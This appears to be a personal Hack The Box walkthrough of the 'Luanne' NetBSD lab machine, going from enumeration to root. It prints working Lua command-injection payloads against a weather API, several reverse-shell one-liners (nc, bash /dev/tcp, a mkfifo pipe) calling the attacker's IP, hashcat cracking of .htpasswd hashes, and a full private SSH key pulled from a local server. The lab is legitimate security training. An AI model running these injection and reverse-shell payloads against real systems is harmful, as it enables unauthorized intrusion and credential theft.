#linux
# Intro
https://app.hackthebox.com/machines/Luanne

# Enumeration
## Nmap
```
 nmap -sC -sV -oA nmap/luanne luanne.htb
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-02 06:18 EST
Nmap scan report for luanne.htb (10.129.220.141)
Host is up (0.19s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
| ssh-hostkey: 
|   3072 20977f6c4a6e5d20cffda3aaa90d37db (RSA)
|   521 35c329e187706d7374b2a9a204a96669 (ECDSA)
|_  256 b3bd316dcc226b18ed2766b4a72ae4a5 (ED25519)
80/tcp   open  http    nginx 1.19.0
| http-robots.txt: 1 disallowed entry 
|_/weather
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=.
|_http-server-header: nginx/1.19.0
|_http-title: 401 Unauthorized
9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=default
|_http-server-header: Medusa/1.12
|_http-title: Error response
Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 162.49 seconds
                                                                  
```

OS is NetBSD, so this is different from usual machines?

## Gobuster
### port 80
```
gobuster dir -u http://luanne.htb --wordlist /usr/share/wordlists/dirbuster/directory-list-1.0.txt  -t 100      
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://luanne.htb
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/03/02 06:21:56 Starting gobuster in directory enumeration mode
===============================================================
Progress: 141708 / 141709 (100.00%)
===============================================================
2023/03/02 06:26:29 Finished
```
### port 9001

## Visit the website
### Login
basic login?
![[Pasted image 20230302203212.png]]
```
```
cannot use burp

## robots.txt
![[Pasted image 20230302203239.png]]

## try /weather
![[Pasted image 20230302203717.png]]

## Gobuster again

```
gobuster dir -u http://luanne.htb/weather --wordlist /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 100

/forecast             (Status: 200) [Size: 90]
```


## /weather/forecast
http://luanne.htb/weather/forecast

![[Pasted image 20230302205003.png]]


## Get JSON through curl

```
curl http://luanne.htb/weather/forecast                                                                          
{"code": 200, "message": "No city specified. Use 'city=list' to list available cities."}
```

### City list
```
curl http://luanne.htb/weather/forecast?city=list
{"code": 200,"cities": ["London","Manchester","Birmingham","Leeds","Glasgow","Southampton","Liverpool","Newcastle","Nottingham","Sheffield","Bristol","Belfast","Leicester"]}         
```

We can use jq command to make it visible.
```json
curl http://luanne.htb/weather/forecast?city=list | jq .
{
  "code": 200,
  "cities": [
    "London",
    "Manchester",
    "Birmingham",
    "Leeds",
    "Glasgow",
    "Southampton",
    "Liverpool",
    "Newcastle",
    "Nottingham",
    "Sheffield",
    "Bristol",
    "Belfast",
    "Leicester"
  ]
}
```

### try some cities
London
```
curl http://luanne.htb/weather/forecast?city=London       
{"code": 200,"city": "London","list": [{"date": "2023-03-02","weather": {"description": "snowy","temperature": {"min": "12","max": "46"},"pressure": "1799","humidity": "92","wind": {"speed": "2.1975513692014","degree": "102.76822959445"}}},{"date": "2023-03-03","weather": {"description": "partially cloudy","temperature": {"min": "15","max": "43"},"pressure": "1365","humidity": "51","wind": {"speed": "4.9522297247313","degree": "262.63571172766"}}},{"date": "2023-03-04","weather": {"description": "sunny","temperature": {"min": "19","max": "30"},"pressure": "1243","humidity": "13","wind": {"speed": "1.8041767538525","degree": "48.400944394059"}}},{"date": "2023-03-05","weather": {"description": "sunny","temperature": {"min": "30","max": "34"},"pressure": "1513","humidity": "84","wind": {"speed": "2.6126398323104","degree": "191.63755226741"}}},{"date": "2023-03-06","weather": {"description": "partially cloudy","temperature": {"min": "30","max": "36"},"pressure": "1772","humidity": "53","wind": {"speed": "2.7699138359167","degree": "104.89152945159"}}}]}           
```

tofu
```
curl http://luanne.htb/weather/forecast?city=tofu  
{"code": 500,"error": "unknown city: tofu"}                                                                                                                                                   
```

### try to get sql injection
single quote

```
curl "http://luanne.htb/weather/forecast?city='"
<br>Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value
```
Lua??

comment out
```
curl "http://luanne.htb/weather/forecast?city=tofu')--"
{"code": 500,"error": "unknown city: tofu    
```
### os.execute()
```
curl "http://luanne.htb/weather/forecast?city=tofu ')+os.execute('whoami')--"
{"code": 500,"error": "unknown city: tofu_httpd
```

### id
```
curl "http://luanne.htb/weather/forecast?city=tofu')+os.execute('id')--"         
{"code": 500,"error": "unknown city: tofuuid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
```

# Foothold
## Reverse shell
### Check connection
```
curl -G --data-urlencode "city=tofu')os.execute('nc 10.10.14.39 1234')--" "http://luanne.htb/weather/forecast"  
```

we can append it as a query using -G.
need to urlencode, otherwise it spits an error.

## Send bash
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#lua
### Bash
```
curl -G --data-urlencode "city=tofu')os.execute('bash -c "bash -i >& /dev/tcp/10.10.14.39/1234 0>&1"')--" "http://luanne.htb/weather/forecast"

zsh: no such file or directory: /dev/tcp/10.10.14.39/1234
```

ummm
### Lua shell
```
curl -G --data-urlencode "city=tofu')require('socket');require('os');t=socket.tcp();t:connect('10.10.14.39','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');--" "http://luanne.htb/weather/forecast"
{"code": 500,"error": "unknown city: tofu<br>Lua error: [string "                httpd.write('{"code": 500,')..."]:2: module 'socket' not found:
        no field package.preload['socket']
        no file '/usr/share/lua/5.3/socket.lua'
        no file '/usr/share/lua/5.3/socket/init.lua'
        no file '/usr/lib/lua/5.3/socket.lua'
        no file '/usr/lib/lua/5.3/socket/init.lua'
        no file '/usr/lib/lua/5.3/socket.so'
        no file '/usr/lib/lua/5.3/loadall.so'

```

ummm
### Netcat OpenBsd payload

```
curl -G --data-urlencode "city=tofu')os.execute('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.39 1234 >/tmp/f')--" "http://luanne.htb/weather/forecast"  
```

```
rlwrap nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.14.39] from (UNKNOWN) [10.129.220.141] 65437
sh: can't access tty; job control turned off
$ whoami
_httpd
```

## Shell as __http
```
rlwrap nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.14.39] from (UNKNOWN) [10.129.220.141] 65435
sh: can't access tty; job control turned off
$ pwd
/var/www
```

```
cat .htpasswd
webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
```

### Hash-identifier
```
 HASH: $1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0

Possible Hashs:
[+] MD5(Unix)
```

### Hashcat
https://hashcat.net/wiki/doku.php?id=example_hashes
we need to use 500

```
hashcat -m 500 htpasswd /usr/share/wordlists/rockyou.txt
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0:iamthebest             
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 500 (md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5))
Hash.Target......: $1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
Time.Started.....: Thu Mar  2 21:19:22 2023 (1 sec)
Time.Estimated...: Thu Mar  2 21:19:23 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     6478 H/s (8.78ms) @ Accel:128 Loops:500 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3072/14344385 (0.02%)
Rejected.........: 0/3072 (0.00%)
Restore.Point....: 2816/14344385 (0.02%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:500-1000
Candidate.Engine.: Device Generator
Candidates.#1....: pirate -> dangerous
Hardware.Mon.#1..: Util: 51%

Started: Thu Mar  2 21:19:01 2023
Stopped: Thu Mar  2 21:19:23 2023
                                      
```

iamthebest is there.

`webapi_user:iamthebest` login

### Login
![[Pasted image 20230303114909.png]]

## -> r.michaels
```
 ps aux | grep r.michaels
r.michaels   501  0.0  0.0  34992  1972 ?     Is   11:16AM 0:00.00 /usr/libexec
```

Make it wider
```
$ ps auxwwwwww | grep r.michaels
r.michaels   501  0.0  0.0  34992  1972 ?     Is   11:16AM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels -b /home/r.michaels/devel/www 
_httpd     24719  0.0  0.0  21676     4 ?     R     2:51AM 0:00.00 grep r.michaels 
```

Running at 3001??

### Access

```
curl -s http://127.0.0.1:3001/
<html><head><title>401 Unauthorized</title></head>
<body><h1>401 Unauthorized</h1>
/: <pre>No authorization</pre>
<hr><address><a href="//127.0.0.1:3001/">127.0.0.1:3001</a></address>
</body></html>
```

~ username
```
curl -s http://127.0.0.1:3001/~r.michaels/
<html><head><title>401 Unauthorized</title></head>
<body><h1>401 Unauthorized</h1>
~r.michaels//: <pre>No authorization</pre>
<hr><address><a href="//127.0.0.1:3001/">127.0.0.1:3001</a></address>
</body></html>
```

```
curl -s http://127.0.0.1:3001/~r.michaels/ -u webapi_user:iamthebest | grep -o 'href=".*">' | sed 's/href="//;s/\/">//' 
..
id_rsa">
```
### Supply creds
we can supply creds since it uses basic auth
```
curl -s http://127.0.0.1:3001/~r.michaels/ -u webapi_user:iamthebest
<!DOCTYPE html>
<html><head><meta charset="utf-8"/>
<style type="text/css">
table {
        border-top: 1px solid black;
        border-bottom: 1px solid black;
}
th { background: aquamarine; }
tr:nth-child(even) { background: lavender; }
</style>
<title>Index of ~r.michaels/</title></head>
<body><h1>Index of ~r.michaels/</h1>
<table cols=3>
<thead>
<tr><th>Name<th>Last modified<th align=right>Size
<tbody>
<tr><td><a href="../">Parent Directory</a><td>16-Sep-2020 18:20<td align=right>1kB
<tr><td><a href="id_rsa">id_rsa</a><td>16-Sep-2020 16:52<td align=right>3kB
</table>
</body></html>

```

```
curl -s http://127.0.0.1:3001/ -u webapi_user:iamthebest | grep -o 'href=".*">' | sed 's/href="//;s/\/">//' 
/weather/forecast?city=list">
/weather/forecast?city=London">
```


### Get ssh key
There is a webserver running locally, and the user is created there, so we should be able to find something within the server.

```
curl -s http://127.0.0.1:3001/~r.michaels/id_rsa -u webapi_user:iamthebest 
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```

## SSH as r.michaels
`chmod 600 id_rsa`
```
ssh -i id_rsa r.michaels@luanne.htb
Last login: Fri Sep 18 07:06:51 2020
NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020

Welcome to NetBSD!

luanne$ whoami
r.michaels
```

## User flag
```
luanne$ ls
backups      devel        public_html  user.txt
luanne$ cat user.txt
```

# Privilege Escalation
## Enumeration
```
luanne$ sudo -l
ksh: sudo: not found
```

### Enc file

in backup
```
luanne$ ls
devel_backup-2020-09-16.tar.gz.enc
```

### Decrypt
copy the file to tmp
and in tmp decrypt the file
```
netpgp --decrypt /home/r.michaels/backups/devel_backup-2020-09-16.tar.gz.enc --output=devel_backup-2020-09-16.tar.gz
```
```
tar -xf devel_backup-2020-09-16.tar.gz    
```

```
luanne$ ls -al
total 36
drwxrwxrwt   3 root        wheel   144 Mar  3 04:51 .
drwxr-xr-x  21 root        wheel   512 Sep 16  2020 ..
drwxr-x---   4 r.michaels  wheel    96 Sep 16  2020 devel-2020-09-16
-rw-------   1 r.michaels  wheel  1639 Mar  3 04:51 devel_backup-2020-09-16.tar.gz
-r--------   1 r.michaels  wheel  1970 Mar  3 04:51 devel_backup-2020-09-16.tar.gz.enc
```
in www
```
luanne$ ls -al
total 32
drwxr-xr-x  2 r.michaels  wheel   96 Sep 16  2020 .
drwxr-x---  4 r.michaels  wheel   96 Sep 16  2020 ..
-rw-r--r--  1 r.michaels  wheel   47 Sep 16  2020 .htpasswd
-rw-r--r--  1 r.michaels  wheel  378 Sep 16  2020 index.html
luanne$ cat .htpasswd
```
files in tmp gets deleted periodically??

```
webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.
```

This hash is also MD5(unix)
```
hashcat -m 500 userhash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.:littlebear             
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 500 (md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5))
Hash.Target......: $1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.
Time.Started.....: Thu Mar  2 23:56:44 2023 (0 secs)
Time.Estimated...: Thu Mar  2 23:56:44 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    14185 H/s (8.90ms) @ Accel:128 Loops:500 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 13056/14344385 (0.09%)
Rejected.........: 0/13056 (0.00%)
Restore.Point....: 12800/14344385 (0.09%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:500-1000
Candidate.Engine.: Device Generator
Candidates.#1....: john cena -> ilove2
Hardware.Mon.#1..: Util:100%

Started: Thu Mar  2 23:56:43 2023
Stopped: Thu Mar  2 23:56:46 2023
```

littlebear is the password.

## Get root
```
luanne$ doas -u root /bin/sh
Password:
sh: Cannot determine current working directory
# whoami
root
```

```
# cd /root
# ls
.cshrc     .klogin    .login     .profile   .shrc      cleanup.sh root.txt
# cat root.txt
```

# Reference
https://0xdf.gitlab.io/2021/03/27/htb-luanne.html